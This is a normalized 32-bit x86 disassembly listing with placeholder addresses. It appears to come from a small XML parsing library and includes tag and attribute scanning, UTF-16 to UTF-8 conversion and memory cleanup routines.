inc ebp
cmp al 0x22
mov [ esp + 0x24 ] al
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
push 0x4
push rw-data
push esi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
lea edx [ esi + 0x9 ]
push rw-data
push edx
call sub_10009280
lea ebx [ eax + esi + 0x9 ]
add esp 0x8
mov [ esp + 0x18 ] ebx
cmp [ ebx ] 0x0
je r-xdata
mov al [ edi ]
xor ebx ebx
cmp al 0x25
jne r-xdata
cmp al 0x27
je r-xdata
push 0x2
push rw-data
push esi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
add esi 0x4
push rw-data
push esi
call sub_10009f60
add esp 0x8
mov esi eax
jmp r-xdata
push rw-data
push ebx
push edi
call sub_10001710
add esp 0xc
push rw-data
push ebx
call sub_10009fe0
mov esi eax
mov al [ esi + ebx ]
add esi ebx
add esp 0x8
cmp al 0x3e
je r-xdata
mov ecx [ esp + 0x20 ]
mov ecx [ ecx + 0x40 ]
mov ecx [ esp + 0x14 ]
jmp r-xdata
push 0x3e
push esi
call sub_10009040
add esp 0x8
mov esi eax
jmp r-xdata
mov al [ esi ]
cmp al 0x3c
jne r-xdata
lea ebx [ esi + 0x2 ]
push rw-data
push ebx
call sub_10009f60
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
test esi esi
je r-xdata
mov [ esi ] 0x0
mov ecx [ edi + 0x44 ]
xor ebp ebp
mov eax [ ecx ]
test eax eax
je r-xdata
lea edx [ ebx * 4 + 0xc ]
push edx
push ecx
call sub_100093be
mov edi eax
mov eax [ esp + 0x30 ]
add esp 0x8
cmp [ eax ] 0x25
jne r-xdata
mov eax ecx
cmp [ ecx ] 0x0
je r-xdata
inc esi
cmp al 0x25
jne r-xdata
push 0x3e
push esi
call sub_10009040
add esp 0x8
mov esi eax
jmp r-xdata
sub eax ebx
inc esi
push eax
push ebx
push edi
call sub_10001db0
add esp 0xc
jmp r-xdata
jmp r-xdata
inc esi
push rw-data
push esi
call sub_10009280
add eax esi
add esp 0x8
mov [ esp + 0x10 ] eax
mov al [ eax ]
test al al
je r-xdata
mov edx ecx
mov ecx [ esp + 0x20 ]
mov [ ecx + 0x40 ] edi
mov [ esp + 0x14 ] edi
jmp r-xdata
mov edx [ eax + 0x4 ]
add eax 0x4
inc ebx
test edx edx
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp al 0x3e
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx [ esp + 0x14 ]
push 0x25
push ecx
push ebp
call sub_10001780
mov [ edi + ebx * 4 + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov [ edi + ebx * 4 + 0x8 ] 0x0
mov edx [ edi + ebx * 4 + 0x4 ]
push edi
push edx
push eax
call sub_10001cd0
add esp 0x18
test eax eax
je r-xdata
mov [ esi ] 0x0
inc esi
movsx eax [ esp + 0x24 ]
mov edx [ esp + 0x18 ]
push eax
push ebp
mov [ edx ] 0x0
call sub_10009040
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov edi [ esp + 0x10 ]
push rw-data
push edi
call sub_10009fe0
mov esi eax
mov al [ esi + edi ]
add esi edi
add esp 0x8
test al al
je r-xdata
mov ebx [ esp + 0x18 ]
mov eax [ edx + 0x4 ]
add edx 0x4
inc ebp
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ edi + 0x1 ]
jne r-xdata
mov edi [ edi + ebx * 4 + 0x4 ]
cmp edi ebp
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ edi + ebx * 4 ] ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
push rw-data
push ebx
push eax
call sub_10001710
add esp 0xc
jmp r-xdata
lea eax [ esi + 0x1 ]
push rw-data
push eax
mov [ esi ] 0x0
call sub_10009280
lea esi [ esi + eax + 0x1 ]
push 0x5
push rw-data
push esi
call sub_10009d90
add esp 0x14
mov edi rw-data
test eax eax
jne r-xdata
mov edi [ eax ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x20 ]
push edx
push rw-data
push ebp
push eax
call sub_10001710
mov edi [ esp + 0x30 ]
add esp 0x10
jmp r-xdata
push edi
call sub_10009e3d
add esp 0x4
push 0x8
push rw-data
push esi
mov [ esp + 0x34 ] edi
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
mov edi rw-data
mov bl [ eax ]
mov cl bl
cmp bl [ edi ]
jne r-xdata
cmp [ esi ] 0x28
jne r-xdata
lea ecx [ esi + 0x8 ]
push rw-data
push ecx
call sub_10009280
add esp 0x8
lea esi [ esi + eax + 0x8 ]
push rw-data
push esi
call sub_10009fe0
add esp 0x8
add esi eax
push 0x29
push esi
call sub_10009040
add esp 0x8
mov esi eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
push rw-data
push ebx
push ecx
call sub_10001710
mov edi [ esp + 0x2c ]
add esp 0xc
jmp r-xdata
push rw-data
push esi
call sub_10009280
add esi eax
push 0x6
push rw-data
push esi
call sub_10009d90
add esp 0x14
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov al [ esi ]
cmp al 0x23
jne r-xdata
lea edx [ esi + 0x6 ]
push rw-data
push edx
call sub_10009280
add esp 0x8
lea esi [ esi + eax + 0x6 ]
cmp al 0x22
je r-xdata
push rw-data
push esi
call sub_10009fe0
lea esi [ esi + eax - 0x1 ]
mov al [ edi ]
add esp 0x8
cmp al 0x20
je r-xdata
movsx eax al
inc esi
push eax
push esi
mov [ esp + 0x2c ] esi
call sub_10009040
mov esi eax
add esp 0x8
test esi esi
je r-xdata
cmp al 0x27
jne r-xdata
inc esi
push rw-data
push esi
call sub_10009280
add eax esi
add esp 0x8
mov [ esp + 0x10 ] eax
mov al [ eax ]
test al al
jne r-xdata
mov [ esp + 0x24 ] 0x0
jmp r-xdata
mov edx [ esp + 0x20 ]
push rw-data
push ebx
push edx
call sub_10001710
add esp 0xc
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov ebx [ esp + 0x20 ]
xor edi edi
mov eax [ ebx + 0x44 ]
cmp [ eax + ebp * 4 ] edi
jne r-xdata
mov eax [ ebx + 0x44 ]
mov edi 0x1
mov ecx [ eax + ebp * 4 ]
mov edx [ ecx + 0x4 ]
lea eax [ ecx + 0x4 ]
test edx edx
je r-xdata
cmp ebp edi
jne r-xdata
lea edx [ edi * 4 + 0x10 ]
push edx
push ecx
call sub_100093be
mov ecx [ ebx + 0x44 ]
add esp 0x8
mov [ ecx + ebp * 4 ] eax
mov edx [ ebx + 0x44 ]
mov eax [ edx + ebp * 4 ]
mov [ eax + edi * 4 + 0xc ] 0x0
mov ecx [ ebx + 0x44 ]
mov eax [ esp + 0x28 ]
mov edx [ ecx + ebp * 4 ]
mov [ edx + edi * 4 + 0x8 ] eax
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov edx [ eax + 0xc ]
add eax 0xc
add edi 0x3
test edx edx
jne r-xdata
lea ecx [ ebp * 4 + 0x8 ]
push ecx
push eax
call sub_100093be
add esp 0x8
push 0x8
call sub_100096ed
add esp 0x4
jmp r-xdata
xor eax eax
mov ecx [ esp + 0x28 ]
mov eax [ ebx + 0x40 ]
mov dl [ ecx ]
mov ecx [ esp + 0x24 ]
push edx
push eax
push ecx
call sub_10001780
add esp 0xc
jmp r-xdata
push 0x8
mov [ ebx + 0x44 ] eax
call sub_100096ed
mov edx [ ebx + 0x44 ]
add esp 0x4
mov [ edx + ebp * 4 ] eax
mov eax [ ebx + 0x44 ]
mov edx [ esp + 0x18 ]
mov ecx [ eax + ebp * 4 ]
mov [ ecx ] edx
mov eax [ ebx + 0x44 ]
mov [ eax + ebp * 4 + 0x4 ] edi
mov ecx [ ebx + 0x44 ]
mov edx [ ecx + ebp * 4 ]
mov [ edx + 0x4 ] edi
mov edx [ ebx + 0x44 ]
mov ecx [ edx + ebp * 4 ]
mov [ ecx + edi * 4 + 0x4 ] eax
mov edx [ ebx + 0x44 ]
mov ecx [ esp + 0x10 ]
mov ebx [ esp + 0x18 ]
mov eax [ edx + ebp * 4 ]
mov [ eax + edi * 4 ] ecx
sub_10002620
sub esp 0x10
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push edi
mov eax [ ebx ]
mov edi [ esp + 0x24 ]
xor ebp ebp
mov al [ eax ]
mov ecx [ edi ]
cmp al 0xfe
mov [ esp + 0x10 ] ecx
jne r-xdata
inc al
neg al
sbb eax eax
cmp eax 0xffffffff
mov [ esp + 0x18 ] eax
jne r-xdata
mov [ esp + 0x18 ] 0x1
push esi
push ecx
call sub_100096ed
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov esi 0x2
add esp 0x4
lea ecx [ eax - 0x1 ]
mov [ esp + 0x18 ] esi
cmp ecx esi
jbe r-xdata
pop edi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov edx [ esp + 0x10 ]
push ebp
push edx
mov [ edi ] ebp
call sub_100093be
add esp 0x8
mov [ ebx ] eax
pop esi
pop edi
pop ebp
pop ebx
add esp 0x10
retn
jmp r-xdata
mov edi [ esp + 0x1c ]
mov eax [ ebx ]
test edi edi
je r-xdata
xor ebx ebx
mov bh [ eax + esi + 0x1 ]
mov bl [ eax + esi ]
xor ebx ebx
mov bh [ eax + esi ]
mov bl [ eax + esi + 0x1 ]
jmp r-xdata
mov eax [ esp + 0x14 ]
lea edi [ ebp + 0x6 ]
cmp edi eax
jbe r-xdata
cmp ebx 0xdfff
jg r-xdata
cmp ebx 0xd800
jl r-xdata
cmp ebx 0x80
jge r-xdata
mov eax [ esp + 0x14 ]
add eax 0x400
mov [ esp + 0x14 ] eax
push eax
mov eax [ esp + 0x14 ]
push eax
call sub_100093be
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x1c ]
add esp 0x8
cmp eax edi
jb r-xdata
add esi 0x2
cmp esi ecx
mov [ esp + 0x18 ] esi
jae r-xdata
xor ecx ecx
mov eax ebx
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
inc ebp
mov [ ecx + ebp - 0x1 ] bl
jmp r-xdata
test edi edi
je r-xdata
add ecx 0xfffffffe
mov eax 0x66666667
imul ecx
sar edx 0x1
mov eax edx
mov ecx 0x7
shr eax 0x1f
add edx eax
mov eax ebx
mov esi edx
or dl 0xff
sub ecx esi
lea edi [ esi + esi * 2 ]
shl edi 0x1
shl dl cl
mov ecx edi
sar eax cl
mov ecx [ esp + 0x10 ]
or dl al
mov [ ecx + ebp ] dl
inc ebp
test esi esi
je r-xdata
cdq
sub eax edx
inc ecx
sar eax 0x1
jne r-xdata
mov ecx [ esp + 0x28 ]
add esi 0x2
mov [ esp + 0x18 ] esi
mov eax [ ecx ]
lea ecx [ eax - 0x1 ]
cmp esi ecx
jb r-xdata
xor edx edx
mov dh [ eax + esi + 0x1 ]
mov dl [ eax + esi ]
mov eax edx
xor ecx ecx
mov ch [ eax + esi ]
mov cl [ eax + esi + 0x1 ]
mov eax ecx
jmp r-xdata
mov esi [ esp + 0x18 ]
sub edi 0x6
mov edx ebx
mov ecx edi
mov eax [ esp + 0x10 ]
sar edx cl
and dl 0x3f
or dl 0x80
mov [ eax + ebp ] dl
inc ebp
dec esi
jne r-xdata
mov ebx [ esp + 0x24 ]
mov edi [ esp + 0x28 ]
mov ebx [ esp + 0x24 ]
and ebx 0x3ff
and eax 0x3ff
shl ebx 0xa
or ebx eax
add ebx 0x10000
sub_100027e0
push ebp
mov ebp [ esp + 0x8 ]
xor ecx ecx
test ebp ebp
je r-xdata
pop ebp
retn
cmp ebp rw-data
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
push ebx
mov ebx [ ebp + ecx * 4 + 0x4 ]
cmp [ ebx ] 0x0
je r-xdata
mov eax ebp
push ebx
call sub_10009e3d
push ebp
call sub_10009e3d
add esp 0x8
pop ebx
push esi
push edi
mov esi ebx
mov edi ebp
mov edx [ eax + 0x8 ]
add eax 0x8
add ecx 0x2
test edx edx
jne r-xdata
test [ esi ] 0x40
je r-xdata
mov eax [ edi ]
push eax
call sub_10009e3d
add esp 0x4
mov al [ esi + 0x1 ]
add edi 0x8
inc esi
test al al
jne r-xdata
mov ecx [ edi + 0x4 ]
push ecx
call sub_10009e3d
add esp 0x4
test [ esi ] 0x80
je r-xdata
pop edi
pop esi
sub_10002860
sub esp 0x1c
push ebx
push ebp
push esi
push edi
push 0x0
call sub_10003340
mov ebp eax
mov eax [ esp + 0x34 ]
add esp 0x4
mov [ esp + 0x18 ] ebp
mov [ ebp + 0x2c ] eax
mov eax [ esp + 0x34 ]
test eax eax
mov [ esp + 0x20 ] 0x0
jne r-xdata
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x30 ]
push ecx
push edx
call sub_10002620
mov [ ebp + 0x34 ] eax
mov eax [ esp + 0x38 ]
mov [ ebp + 0x38 ] eax
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
add esp 0x8
add ecx edx
mov [ ebp + 0x3c ] ecx
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x34 ]
mov bl [ eax + ecx - 0x1 ]
mov [ eax + ecx - 0x1 ] 0x0
mov ecx [ esp + 0x30 ]
mov [ esp + 0x13 ] bl
mov al [ ecx ]
test al al
je r-xdata
push rw-data
push 0x0
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
cmp [ ecx ] 0x0
jne r-xdata
cmp al 0x3c
je r-xdata
mov esi 0x1
push rw-data
push ecx
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
inc ecx
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
test al al
jne r-xdata
movsx edx [ ecx ]
mov eax [ rw-data ]
mov ax [ eax + edx * 2 ]
and eax 0x103
movsx eax [ ecx ]
push 0x103
push eax
call sub_10009dc8
mov ecx [ esp + 0x38 ]
add esp 0x8
jmp r-xdata
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
mov al [ ecx ]
cmp al 0x5f
je r-xdata
test eax eax
jne r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push rw-data
push ecx
call sub_10009fe0
mov ecx [ esp + 0x38 ]
add esp 0x8
add ecx eax
cmp al 0x3a
je r-xdata
movsx edx [ ecx ]
mov eax [ rw-data ]
mov al [ eax + edx * 2 ]
and eax 0x8
movsx ecx [ ecx ]
push 0x8
push ecx
call sub_10009dc8
mov ecx [ esp + 0x38 ]
add esp 0x8
jmp r-xdata
test al al
jl r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov [ ecx ] 0x0
mov ecx [ esp + 0x30 ]
inc ecx
jmp r-xdata
test eax eax
je r-xdata
cmp al 0x2f
jne r-xdata
xor edi edi
test dl dl
je r-xdata
cmp dl 0x2f
je r-xdata
mov eax [ rw-data ]
mov [ esp + 0x30 ] ecx
cmp eax esi
jle r-xdata
push 0x3
push rw-data
push ecx
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
lea edi [ ecx + 0x1 ]
push rw-data
push edi
call sub_10009fe0
mov ecx [ esp + 0x38 ]
add esp 0x8
lea eax [ ecx + eax + 0x1 ]
mov [ esp + 0x30 ] eax
mov bl [ eax ]
test bl bl
jne r-xdata
mov bl [ ecx ]
cmp bl 0x2f
jne r-xdata
cmp dl 0x2f
je r-xdata
cmp dl 0x3e
je r-xdata
mov ecx [ esp + 0x30 ]
push 0x8
push rw-data
push ecx
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
push rw-data
add eax 0x3
push eax
call sub_10009f60
mov ecx eax
add esp 0x8
test ecx ecx
mov [ esp + 0x30 ] ecx
je r-xdata
mov [ eax ] 0x0
mov edx [ esp + 0x30 ]
push edx
push edi
push ebp
call sub_10001c60
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x13 ] 0x3e
jne r-xdata
cmp bl 0x3e
je r-xdata
mov [ ecx ] 0x0
mov eax [ esp + 0x30 ]
inc eax
mov [ esp + 0x30 ] eax
mov al [ eax ]
test al al
je r-xdata
cmp dl 0x3e
je r-xdata
mov eax [ esp + 0x18 ]
mov eax [ eax + 0x44 ]
mov esi [ eax ]
test esi esi
mov [ esp + 0x20 ] esi
je r-xdata
mov ecx [ esp + 0x30 ]
push 0x8
push rw-data
push ecx
call sub_10009d90
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x30 ]
push rw-data
push edx
call sub_10009f60
add esp 0x8
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
add ecx 0x2
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
cmp al 0x3e
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
cmp [ rw-data ] esi
jle r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
mov [ ecx ] 0x0
mov ecx [ esp + 0x14 ]
push eax
push ecx
push edx
call sub_10001af0
mov eax [ esp + 0x3c ]
mov edi [ esp + 0x20 ]
mov ebp [ esp + 0x24 ]
add esp 0xc
mov [ eax ] bl
mov ecx [ esp + 0x30 ]
jmp r-xdata
test bl bl
jne r-xdata
cmp [ esp + 0x13 ] 0x3e
jne r-xdata
cmp al 0x3e
jne r-xdata
test edi edi
je r-xdata
mov ebp eax
mov eax [ esp + 0x30 ]
cmp [ eax ] 0x3f
jne r-xdata
mov ecx [ esp + 0x30 ]
xor esi esi
mov al [ ecx ]
test al al
je r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
add eax 0x2
push 0x63
mov [ esp + 0x34 ] eax
sub eax edi
sub eax 0xa
push eax
lea eax [ edi + 0x8 ]
push eax
push ebp
call sub_10001b40
add esp 0x10
test al al
jne r-xdata
test al al
jne r-xdata
mov edx [ esp + 0x30 ]
movsx eax bl
mov [ edx ] bl
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
mov eax [ esp + 0x30 ]
push 0x8
movsx ecx bl
push ecx
mov [ eax ] bl
call sub_10009dc8
add esp 0x8
jmp r-xdata
test ecx ecx
je r-xdata
test edi edi
je r-xdata
cmp [ esp + 0x13 ] 0x3e
jne r-xdata
test edi edi
je r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
push ecx
push esi
push edi
call sub_10001af0
mov edx [ esp + 0x3c ]
push edx
push esi
push edi
call sub_10001c60
mov ecx [ esp + 0x48 ]
mov ebp [ esp + 0x30 ]
add esp 0x18
mov edi esi
jmp r-xdata
test al al
jne r-xdata
push 0x10
call sub_100096ed
add esp 0x4
mov esi eax
mov [ esp + 0x1c ] esi
push 0x2
call sub_100096ed
add esp 0x4
mov edx [ esp + 0x1c ]
lea ecx [ edi * 4 + 0x10 ]
push ecx
push edx
call sub_100093be
mov esi eax
mov eax edi
cdq
sub eax edx
add esp 0x8
sar eax 0x1
add eax 0x2
mov [ esp + 0x1c ] esi
push eax
mov eax [ esi + edi * 4 + 0x4 ]
push eax
call sub_100093be
add esp 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push 0x3f
push eax
call sub_10009040
add esp 0x8
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp + 0x28 ]
test eax eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
cmp bl 0x3e
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x30 ]
push rw-data
push edx
call sub_10009280
mov ecx [ esp + 0x38 ]
add esp 0x8
add ecx eax
mov [ esp + 0x30 ] ecx
jmp r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
push rw-data
push edx
push eax
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_100027e0
add esp 0x4
mov [ ecx ] 0x0
mov eax [ esp + 0x30 ]
inc eax
push rw-data
push eax
mov [ esp + 0x38 ] eax
call sub_10009280
mov ecx [ esp + 0x38 ]
add esp 0x8
add ecx eax
mov [ esp + 0x30 ] ecx
mov bl [ ecx ]
cmp bl 0x22
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov ecx eax
mov eax edi
cdq
sub eax edx
mov [ esi + edi * 4 + 0xc ] ecx
mov dx [ rw-data ]
push rw-data
sar eax 0x1
mov [ esp + 0x2c ] eax
mov [ eax + ecx ] dx
mov [ esi + edi * 4 + 0x8 ] 0x0
mov [ esi + edi * 4 + 0x4 ] rw-data
mov eax [ esp + 0x34 ]
mov [ esi + edi * 4 ] eax
mov ecx [ esp + 0x34 ]
push ecx
call sub_10009fe0
mov ecx [ esp + 0x38 ]
add esp 0x8
add ecx eax
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
cmp al 0x3d
je r-xdata
mov eax [ ebp + 0x4 ]
add ebp 0x4
test eax eax
mov [ esp + 0x20 ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov bl [ esi + 0x1 ]
mov al bl
cmp bl [ edi + 0x1 ]
jne r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
inc eax
mov [ esp + 0x30 ] eax
mov cl [ eax ]
test cl cl
je r-xdata
test esi esi
je r-xdata
cmp bl 0x3e
jne r-xdata
cmp al 0x5d
jne r-xdata
cmp al 0x3e
je r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov [ ecx ] 0x0
mov ecx [ esp + 0x30 ]
inc ecx
mov [ esp + 0x30 ] ecx
mov edi ecx
mov al [ ecx ]
test al al
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x1c ]
inc ecx
mov [ esp + 0x30 ] ecx
mov [ ebp + edi * 4 + 0x4 ] ecx
mov ecx [ esp + 0x30 ]
mov al [ ecx ]
test al al
je r-xdata
cmp bl 0x27
jne r-xdata
mov edx [ rw-data ]
movsx eax al
mov al [ edx + eax * 2 ]
and eax 0x8
movsx edx al
push 0x8
push edx
call sub_10009dc8
mov ecx [ esp + 0x38 ]
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edi [ esp + 0x14 ]
mov esi [ eax ]
test eax eax
je r-xdata
add esi 0x2
add edi 0x2
test al al
jne r-xdata
test eax eax
je r-xdata
cmp cl 0x3e
jne r-xdata
push 0x5b
push edi
call sub_10009040
mov ecx [ esp + 0x38 ]
inc eax
mov edi eax
mov eax ecx
sub eax edi
inc ecx
push eax
push edi
push ebp
mov [ esp + 0x44 ] ecx
call sub_10002020
add esp 0x14
test ax ax
je r-xdata
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
inc ecx
push rw-data
push ecx
call sub_10009fe0
mov edx [ esp + 0x38 ]
add esp 0x8
lea ecx [ edx + eax + 0x1 ]
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
cmp al 0x5b
jne r-xdata
inc ecx
push rw-data
push ecx
call sub_10009280
mov ecx [ esp + 0x38 ]
add esp 0x8
cmp [ eax + ecx + 0x1 ] 0x3e
je r-xdata
jmp r-xdata
push eax
push rw-data
push edi
push ebp
call sub_10001710
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
push rw-data
push edi
push ebp
call sub_10001710
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
cmp al 0x3c
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
cmp al bl
je r-xdata
mov esi 0x1
test eax eax
je r-xdata
mov bl [ esi ]
mov al bl
cmp bl [ edi ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
test al al
jne r-xdata
mov esi 0x1
test al al
je r-xdata
cmp al 0x3c
je r-xdata
push ebp
call sub_100027e0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
movsx ecx bl
push ecx
push rw-data
push edx
push eax
call sub_10001710
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x20 ]
mov [ ecx ] 0x0
mov edx [ esp + 0x30 ]
inc edx
mov [ esp + 0x30 ] edx
mov edx 0x1
test eax eax
je r-xdata
inc ecx
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
test al al
jne r-xdata
movsx edx [ ecx ]
mov eax [ rw-data ]
mov al [ eax + edx * 2 ]
and eax 0x8
movsx ecx [ ecx ]
push 0x8
push ecx
call sub_10009dc8
mov ecx [ esp + 0x38 ]
add esp 0x8
jmp r-xdata
sub eax edi
sub eax 0x2
push eax
lea eax [ edi + 0x1 ]
push eax
push ebp
call sub_10001db0
add esp 0xc
jmp r-xdata
cmp bl 0x3e
jne r-xdata
mov bl [ esp + 0x13 ]
mov esi 0x1
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
mov [ esp + 0x30 ] ecx
mov al [ ecx ]
test al al
jne r-xdata
mov eax 0x20
add eax 0x4
mov dl [ ecx ]
add edi 0x2
test dl dl
jne r-xdata
inc ecx
mov [ esp + 0x30 ] ecx
jmp r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
inc ecx
mov edi ecx
cmp eax esi
mov [ esp + 0x1c ] rw-data
mov [ esp + 0x30 ] ecx
mov [ esp + 0x14 ] edi
jle r-xdata
sub ecx edi
push 0x26
push ecx
push edi
push ebp
call sub_10001b40
mov ecx [ esp + 0x40 ]
mov bl [ esp + 0x23 ]
add esp 0x10
mov esi 0x1
jmp r-xdata
mov edx [ ebp + edi * 4 + 0xc ]
mov eax [ esp + 0x28 ]
mov [ eax + edx ] 0x40
mov ecx [ esp + 0x30 ]
mov ecx [ esp + 0x30 ]
cmp eax ecx
jbe r-xdata
mov eax [ esp + 0x20 ]
cmp [ eax + edx * 4 ] 0x0
je r-xdata
mov esi [ ebp + edi * 4 ]
cmp [ rw-data ] esi
jle r-xdata
mov ecx [ eax + edx * 4 + 0x8 ]
movsx eax [ ecx ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ ebp + edi * 4 + 0x4 ]
push eax
mov eax [ edx + 0x40 ]
push eax
push ecx
call sub_10001780
mov ecx [ esp + 0x20 ]
add esp 0xc
cmp eax ecx
mov [ ebp + edi * 4 + 0x4 ] eax
jb r-xdata
mov eax [ esp + 0x24 ]
add edx 0x3
add eax 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl [ eax + 0x1 ]
mov cl bl
cmp bl [ esi + 0x1 ]
jne r-xdata
mov [ esp + 0x24 ] eax
mov eax [ eax ]
test eax eax
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov bl [ eax ]
mov cl bl
cmp bl [ esi ]
jne r-xdata
sub_100031a0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x1c ]
push eax
call sub_100031a0
mov ecx [ esi + 0x18 ]
push ecx
call sub_100031a0
mov eax [ esi + 0x20 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ecx
call sub_100027e0
mov al [ esi + 0x24 ]
add esp 0x4
test al 0x40
je r-xdata
mov eax [ esi + 0x40 ]
push ebx
push ebp
push edi
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
test [ esi + 0x24 ] 0x80
je r-xdata
mov edx [ esi + 0x8 ]
push edx
call sub_10009e3d
add esp 0x4
mov edx [ esi + 0x40 ]
push edx
call sub_10009e3d
mov eax [ esi + 0x44 ]
add esp 0x4
mov ebx [ eax ]
test ebx ebx
je r-xdata
mov edi 0x28
push esi
call sub_10009e3d
add esp 0x4
mov eax [ esi ]
push eax
call sub_10009e3d
add esp 0x4
mov eax [ esi + 0x44 ]
cmp [ eax ] 0x0
je r-xdata
xor ebp ebp
push eax
call sub_10009e3d
add esp 0x4
cmp eax [ esi + 0x3c ]
jbe r-xdata
mov ecx [ esi + 0x48 ]
mov eax [ ecx ]
test eax eax
je r-xdata
push eax
call sub_10009e3d
add esp 0x4
push ebx
call sub_10009e3d
mov edx [ esi + 0x44 ]
add ebp 0x4
add esp 0x4
mov ebx [ edx + ebp ]
test ebx ebx
jne r-xdata
lea edi [ ebx + 0x8 ]
mov eax [ edi + eax + 0x4 ]
mov ecx [ esi + 0x38 ]
cmp eax ecx
jb r-xdata
mov eax [ esi + 0x40 ]
add edi 0x8
cmp [ edi + eax ] 0x0
jne r-xdata
mov eax [ esi + 0x48 ]
pop edi
pop ebp
pop ebx
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
xor edi edi
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ edi + 0x8 ]
add edi 0x8
add edi 0x4
